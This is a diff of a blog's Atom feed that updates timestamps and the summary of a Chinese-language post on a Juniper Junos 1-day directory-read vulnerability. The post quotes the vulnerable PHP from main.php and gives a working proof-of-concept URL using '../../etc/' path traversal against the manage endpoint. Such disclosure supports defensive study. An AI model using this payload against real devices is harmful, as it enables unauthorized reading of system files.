@@ -6,7 +6,7 @@
   <link href="http://ioo0s.art/atom.xml" rel="self"/>
   
   <link href="http://ioo0s.art/"/>
-  <updated>2023-02-24T12:28:44.037Z</updated>
+  <updated>2023-02-24T12:31:30.448Z</updated>
   <id>http://ioo0s.art/</id>
   
   <author>
@@ -21,16 +21,12 @@
     <link href="http://ioo0s.art/2023/02/24/juniper-1day-%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95%E8%AF%BB/"/>
     <id>http://ioo0s.art/2023/02/24/juniper-1day-%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95%E8%AF%BB/</id>
     <published>2023-02-24T12:25:01.000Z</published>
-    <updated>2023-02-24T12:28:44.037Z</updated>
+    <updated>2023-02-24T12:31:30.448Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="测试版本"><a href="#测试版本" class="headerlink" title="测试版本"></a>测试版本</h2><p>junos-vsrx3-x86-64-20.3R1.8.ide.ova</p><h2 id="漏洞过程"><a href="#漏洞过程" class="headerlink" title="漏洞过程"></a>漏洞过程</h2><p>漏洞存在于 <code>html\modules\manage\files\main.php</code> 中</p><pre><code>functiondo_manage_files ()&#123;    ......        case MANAGE_FILES_BROWSE:            // Browse (Download and Delete) files            $path = get_val_or_null($_GET, &#39;path&#39;);            漏洞存在于这里,这里只验证了path是否存在，未验证路径是否合法            if (do_manage_files_validate_file($path, null)) &#123;                $sections = do_manage_files_browse($path);                break;            &#125; else &#123;                 $sections = do_manage_files_main();             &#125;            break;    &#125;  .....&#125;</code></pre><p>利用 poc</p><pre><code>https://192.168.1.100/manage?m[]=files&amp;action=browse&amp;path=/var/log/../../etc/</code></pre><p><img src="/2023/02/24/juniper-1day-%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95%E8%AF%BB/boxcnpZx0PSdeZkzE19ylKJJD3d.png"></p>]]></content>
+    <content type="html"><![CDATA[<h2 id="测试版本"><a href="#测试版本" class="headerlink" title="测试版本"></a>测试版本</h2><p>junos-vsrx3-x86-64-20.3R1.8.ide.ova</p><span id="more"></span><h2 id="漏洞过程"><a href="#漏洞过程" class="headerlink" title="漏洞过程"></a>漏洞过程</h2><p>漏洞存在于 <code>html\modules\manage\files\main.php</code> 中</p><pre><code>functiondo_manage_files ()&#123;    ......        case MANAGE_FILES_BROWSE:            // Browse (Download and Delete) files            $path = get_val_or_null($_GET, &#39;path&#39;);            漏洞存在于这里,这里只验证了path是否存在，未验证路径是否合法            if (do_manage_files_validate_file($path, null)) &#123;                $sections = do_manage_files_browse($path);                break;            &#125; else &#123;                 $sections = do_manage_files_main();             &#125;            break;    &#125;  .....&#125;</code></pre><p>利用 poc</p><pre><code>https://192.168.1.100/manage?m[]=files&amp;action=browse&amp;path=/var/log/../../etc/</code></pre><p><img src="/2023/02/24/juniper-1day-%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95%E8%AF%BB/boxcnpZx0PSdeZkzE19ylKJJD3d.png"></p>]]></content>
     
     
-      
-      
-    <summary type="html">&lt;h2 id=&quot;测试版本&quot;&gt;&lt;a href=&quot;#测试版本&quot; class=&quot;headerlink&quot; title=&quot;测试版本&quot;&gt;&lt;/a&gt;测试版本&lt;/h2&gt;&lt;p&gt;junos-vsrx3-x86-64-20.3R1.8.ide.ova&lt;/p&gt;
-&lt;h2 id=&quot;漏洞过程&quot;&gt;&lt;a href=</summary>
-      
+    <summary type="html">&lt;h2 id=&quot;测试版本&quot;&gt;&lt;a href=&quot;#测试版本&quot; class=&quot;headerlink&quot; title=&quot;测试版本&quot;&gt;&lt;/a&gt;测试版本&lt;/h2&gt;&lt;p&gt;junos-vsrx3-x86-64-20.3R1.8.ide.ova&lt;/p&gt;</summary>
     
     
     
